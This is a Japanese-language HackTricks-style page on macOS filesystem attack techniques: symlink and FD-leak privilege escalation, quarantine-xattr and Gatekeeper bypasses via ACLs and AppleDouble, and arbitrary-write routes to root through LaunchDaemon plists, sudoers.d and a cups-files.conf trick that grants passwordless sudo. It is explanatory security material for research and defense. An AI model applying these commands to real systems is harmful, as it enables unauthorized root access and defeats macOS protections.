# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**directory** では、3つの permission bits は通常の file とは異なる意味を持ちます。`chmod(1)` は directory に適用された場合、execute bit を "**search**" と呼びます:<sup>[[2]](#references)</sup>

> `0100` For files, allow execution by owner. For directories, allow the owner to **search** in the directory.

- **read** - directory entries を **enumerate**（名前を一覧表示）できます。
- **write** - directory 内の entries を **create, rename and delete** できます。これは *含んでいる* directory の property であり、file の property ではない点に注意してください。parent directory に write できる限り、read や write ができない file でも delete できます。
- **subdirectory** を delete するには空でなければならず、そのためには内部のすべてを remove するのに十分な rights が必要です。
- directory に **sticky bit**（`S_ISVTX`、`/tmp` など）がある場合、これは制限されます — POSIX では、その場合 process は file の owner、directory の owner、または適切な privileges を持っている場合にのみ、その中の files を remove または rename できると規定されています。<sup>[[1]](#references)</sup>
- **execute / search** - directory を **traverse** することが **allowed** されます。Pathname resolution は各 component を「その predecessor によって指定された directory 内」で locate するため、path prefix のいずれか1つの component で search rights を失うと、leaf file 自体が world-readable であっても、その下にあるすべてのものが path から unreachable になります。<sup>[[1]](#references)</sup>

### Dangerous Combinations

**root が所有する file/folder を overwrite する方法**:

- path 内のいずれかの parent **directory owner** が user である
- path 内のいずれかの parent **directory owner** が、**write access** を持つ **users group** である
- users **group** が **file** への **write** access を持つ

上記のいずれかの combinations により、attacker は expected path に **sym/hard link** を **inject** し、privileged arbitrary write を取得できます。

### Folder root R+X special case

これは、上記の pathname-resolution rule から直接導かれます。directory が **root にのみ R+X を与える**場合、それ以外のすべての user にとって、その内部の files は *path によって* unreachable になります — ただし、**files 自身の permission bits は permissive なままの場合があります**。妨げとなっているのは directory だけです。

したがって、file をその directory **の外へ出す**ことができる primitive — attacker が選択した path を、あなたが traverse できる location へ privileged process が **moves/renames/copies** するもの — があれば、file 自身の mode を defeat する必要なく arbitrary read へと変わります:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
特権でファイルを移動する機能（installer、log rotator、crash/diagnostic collector、backup、「export」機能など）のうち、低い権限のユーザーからソースパスを受け取るものを探します。

## Symbolic Link / Hard Link

### Permissive file/folder

特権プロセスが、**低い権限のユーザーによって制御可能**、または低い権限のユーザーによって**事前に作成可能**な **file** にデータを書き込んでいる場合。そのユーザーは、Symbolic link または Hard link を使ってその **file** を別のファイルに**向ける**だけで、特権プロセスにそのファイルを書き込ませることができます。

攻撃者が**任意の書き込みを悪用して権限を昇格**できる可能性については、他のセクションを確認してください。

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) によれば、*「`O_NOFOLLOW` がマスクに指定され、`open()` に渡された対象ファイルが symbolic link の場合、`open()` は失敗する」*。チェックされるのは**最後の**コンポーネントだけで、すべての**中間**コンポーネントは引き続き解決され、追跡されます。そのため、`O_NOFOLLOW` で書き込みを「保護」した開発者であっても、対象パスの**親ディレクトリ**のいずれかに symlink を仕掛けることで攻撃できます。<sup>[[3]](#references)</sup>

同じ man page には、この問題を実際に解消するフラグも記載されています。<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *「... `open()` に渡されたパスのいずれかのコンポーネントが symbolic link の場合、`open()` は失敗する」*
- **`O_RESOLVE_BENEATH`** — *「... 指定されたパスの解決が fd に関連付けられたディレクトリから抜け出す場合、`openat()` は失敗する」*

それ以外では、すでに検証済みのディレクトリ FD に対して相対的に `openat()` を使用するか、`realpath()` の後に再検証することが、パスの途中での symlink swap を阻止する残された方法です。

## .fileloc

**`.fileloc`** 拡張子のファイルは、他のアプリケーションまたはバイナリを指すことができるため、それらを開くと、そのアプリケーションまたはバイナリが実行されます。\
例:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

`open` の呼び出しにフラグ `O_CLOEXEC` がない場合、file descriptor は child process に継承されます。したがって、privileged process が privileged file を開き、attacker が制御する process を実行すると、attacker は **privileged file への FD を継承します**。

canonical example は **OS X 10.10 の `DYLD_PRINT_TO_FILE` LPE** です（[SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` は、特定の変数が `processDyldEnvironmentVariable()` の外部で parse されていたため、**restricted (suid root) binaries** でも `DYLD_PRINT_TO_FILE=/path` を受け入れました。
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` を実行したため、**任意の path に root-owned file を作成しました**。
- FD は **決して close されず、close-on-exec flag もなかった**ため、suid binary のすべての child は **root-owned file への writable FD** を継承しました。
- 例えば `DYLD_PRINT_TO_FILE=/etc/target suid_binary` を実行し、child で継承された FD number を読み取ると、任意の root-owned write が可能でした。さらに `fcntl(fd, F_SETFL, 0)` により `O_APPEND` も clear でき、append ではなく overwrite が可能になりました。

同じ形は、privileged process が、あなたが制御するものを `exec` する **前** に file を開く場合（helper tools、`$EDITOR` 経由で呼び出される `crontab`-style editors、env-var path から開かれる log/debug files など）にも現れます。継承した FD を次のコマンドで列挙します:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2`を超え、かつ自分で開けないファイルを指しているものは、任意書き込み（または任意読み取り）primitiveです。

## quarantine xattrs tricksを回避する

### 削除する
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

ファイルやフォルダにこの immutable 属性が設定されている場合、そこに xattr を付与することはできません。
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr サポートのないファイルシステム

macOS がマウントできるすべてのファイルシステムが、**extended attributes** をネイティブに保存できるわけではありません。HFS+ と APFS は対応していますが、**FAT32、exFAT、（ほとんどの）NFS マウントは対応していません** — macOS は `._<filename>` という名前の **AppleDouble** サイドファイルを書き込むことで、これらをエミュレートします ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/))。<sup>[[5]](#references)</sup>

これは quarantine に関係します。xattr が同じボリュームから実際に書き込みおよび**読み戻し**できる場合にのみ、quarantine は存続するためです：
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
ボリュームが後から `._` companion を無視するパスで読み取られる場合（または companion が削除・除去された場合）、ファイルは **quarantine flag なしで** 到達します。そして、quarantine されていない `.app` だけで App Sandbox を回避できます。詳細は [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) を参照してください。

### writeextattr ACL

この ACL は、ファイルへの `xattrs` の追加を防ぎます。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format は、ACE を含むファイルをコピーします。

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) では、**`com.apple.acl.text`** という xattr 内に保存された ACL のテキスト表現が、解凍されたファイルの ACL として設定されることを確認できます。そのため、他の xattr が書き込まれるのを防ぐ ACL を持つ **AppleDouble** file format の zip ファイルに application を圧縮すると、quarantine xattr は application に設定されません。

詳細については、[**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) を確認してください。<sup>[[6]](#references)</sup>

これを再現するには、まず正しい acl string を取得する必要があります。
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（これが機能する場合でも、sandbox は先に quarantine xattr を書き込むことに注意してください）

必須ではありませんが、念のため残しておきます:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## signature checks の Bypass

### platform binaries チェックの Bypass

一部の security checks では、XPC service への接続を許可するために、binary が **platform binary** かどうかを確認します。しかし、https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ で公開されている bypass の 1 つで説明されているように、platform binary（/bin/ls など）を取得し、環境変数 `DYLD_INSERT_LIBRARIES` を使用して dyld 経由で exploit を inject することで、このチェックを bypass できます。<sup>[[7]](#references)</sup>

### `CS_REQUIRE_LV` および `CS_FORCED_LV` flags の Bypass

実行中の binary が、次のような code によって自身の flags を変更し、checks を bypass することが可能です:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures のバイパス

Bundles には **`_CodeSignature/CodeResources`** ファイルが含まれており、**bundle** 内のすべての **file** の **hash** が格納されています。なお、CodeResources の hash も **executable** に埋め込まれているため、これを変更することもできません。

しかし、signature がチェックされない file もいくつかあります。これらの file には plist 内で `omit` key が指定されています。例:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
cliからリソースのsignatureを計算できます：
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmg のマウント

ユーザーは、既存のフォルダ上にも、作成したカスタム dmg をマウントできます。これは、カスタムコンテンツを含むカスタム dmg パッケージを作成する方法です:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
通常、macOS は `com.apple.DiskArbitrarion.diskarbitrariond` Mach service（`/usr/libexec/diskarbitrationd` によって提供）と通信してディスクをマウントします。LaunchDaemons plist file にパラメータ `-d` を追加して再起動すると、ログが `/var/log/diskarbitrationd.log` に保存されます。\
ただし、`hdik` や `hdiutil` などの tools を使用して、`com.apple.driver.DiskImages` kext と直接通信することも可能です。

## Arbitrary Writes

### Periodic sh scripts

スクリプトが **shell script** として解釈される場合、毎日実行される **`/etc/periodic/daily/999.local`** shell script を上書きできます。

次のコマンドで、このスクリプトの実行を **fake** できます: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** のような任意の **LaunchDaemon** を、次のように任意のスクリプトを実行する plist として書き込みます:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh` を作成し、root として実行したい **commands** を記述します。

### Sudoers File

**arbitrary write** が可能な場合、**sudo** 権限を自分に付与するファイルを **`/etc/sudoers.d/`** 内に作成できます。

### PATH files

**`/etc/paths`** は PATH 環境変数に値を追加する主な場所の 1 つです。上書きするには root 権限が必要ですが、**privileged process** のスクリプトが **full path なしで command** を実行している場合、このファイルを変更することで **hijack** できる可能性があります。

また、**`/etc/paths.d`** にファイルを書き込み、PATH 環境変数に新しいフォルダーを読み込ませることもできます。

### cups-files.conf

この technique は[この writeup](https://www.kandji.io/blog/macos-audit-story-part1)で使用されています。<sup>[[8]](#references)</sup>

次の内容で `/etc/cups/cups-files.conf` ファイルを作成します:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
これにより、パーミッション 777 のファイル `/etc/sudoers.d/lpe` が作成されます。末尾の余分なジャンクは、エラーログの作成をトリガーするためのものです。

次に、権限を昇格するために必要な設定（`%staff ALL=(ALL) NOPASSWD:ALL` など）を `/etc/sudoers.d/lpe` に書き込みます。

その後、`/etc/cups/cups-files.conf` を再度変更し、`LogFilePerm 700` を指定します。これにより、新しい sudoers ファイルが有効になり、`cupsctl` が実行されます。

### Sandbox Escape

FS arbitrary write を利用して macOS sandbox から escape することが可能です。いくつかの例については [macOS Auto Start](../../../../macos-auto-start-locations.md) のページを確認してください。一般的な方法の 1 つは、起動時にコマンドを実行する Terminal preferences ファイルを `~/Library/Preferences/com.apple.Terminal.plist` に書き込み、`open` を使って呼び出すことです。

## 他のユーザーとして writable files を生成する

非常に一般的な privesc primitive は、**特権プロセスに、あなたが管理するディレクトリ内でファイルを作成させ**、そのファイルへの **write access** を維持することです。必要な要素は 2 つあります。

1. 自分が所有するディレクトリ（または **inheritable ACL** を設定できるディレクトリ）。これにより、その中で作成されるすべてのものが自分の permissions を継承します。
2. ファイルを作成する **場所** を指定できる privileged/`suid` process。通常は、debug/logging environment variable、config file、または helper の XPC API を介して指定します。

作成されたファイルが別のユーザーによって所有されていても、自分が writable になるのは **inheritable ACL** のおかげです。`file_inherit` / `directory_inherit` inheritance flags については、[`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) に記載されています。<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
現在、特権プロセスが `$DIRNAME` 内に作成するファイルはすべて、**あなたが書き込み可能**です。そのディレクトリが、後で **root として実行される**場所（`/etc/periodic/*`、`/etc/cron.d`、`/etc/sudoers.d`、LaunchDaemon のディレクトリなど）でもある場合、これは直接的な root 権限昇格につながります。ファイルを取得した後に何を書き込むべきかについては、上記の [Sudoers File](#sudoers-file) および [cups-files.conf](#cups-filesconf) セクションを参照してください。

「env 変数によって root プロセスにファイルを作成させ、その FD があなたにリークする」チェーンの完全な実例については、上記の [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) を参照してください。

## POSIX Shared Memory

**POSIX shared memory** により、POSIX 準拠のオペレーティングシステム上のプロセスは共通のメモリ領域にアクセスでき、他のプロセス間通信方式と比較して、より高速な通信が可能になります。これは、`shm_open()` で共有メモリオブジェクトを作成または開き、`ftruncate()` でサイズを設定し、`mmap()` を使用してプロセスのアドレス空間にマッピングすることで実現されます。プロセスは、このメモリ領域を直接読み書きできます。同時アクセスを管理し、データ破損を防ぐために、mutex や semaphore などの同期メカニズムがよく使用されます。最後に、プロセスは `munmap()` と `close()` で共有メモリのマッピングを解除して閉じ、必要に応じて `shm_unlink()` でメモリオブジェクトを削除します。このシステムは、複数のプロセスが共有データに高速かつ効率的にアクセスする必要がある環境で、効率的な高速 IPC を実現するのに特に有効です。

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Consumer Code Example</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** は、ユーザーアプリケーションにおける **file descriptor operations** の安全性と信頼性を高めるために macOS に導入されたセキュリティ機能です。これらの guarded descriptors は、file descriptor に特定の制限、つまり「guards」を関連付ける手段を提供し、それらは kernel によって強制されます。

この機能は、**unauthorized file access** や **race conditions** など、特定の種類のセキュリティ脆弱性を防止するうえで特に有用です。これらの脆弱性は、例えばある thread が file description にアクセスし、それによって **別の脆弱な thread に対するアクセスを許可してしまう** 場合や、file descriptor が **脆弱な child process に継承される** 場合に発生します。この機能に関連する関数には、次のものがあります。

- `guarded_open_np`: guard 付きで FD を開く
- `guarded_close_np`: 閉じる
- `change_fdguard_np`: descriptor の guard flags を変更する（guard protection を削除することも可能）

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec なしで leak した FD)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
